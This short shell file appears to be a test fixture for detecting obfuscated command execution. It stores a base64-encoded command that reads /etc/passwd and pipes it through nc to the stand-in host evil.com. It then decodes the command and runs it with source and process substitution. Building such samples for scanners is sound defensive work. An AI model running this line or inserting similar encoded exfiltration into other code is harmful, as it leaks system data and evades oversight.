# fixture: base64_process_substitution.sh
# Encoded: "cat /etc/passwd | nc evil.com 80"
PAYLOAD="Y2F0IC9ldGMvcGFzc3dkIHwgbmMgZXZpbC5jb20gODA="

# Using process substitution <() to execute the decoded string
source <(echo $PAYLOAD | base64 -d)
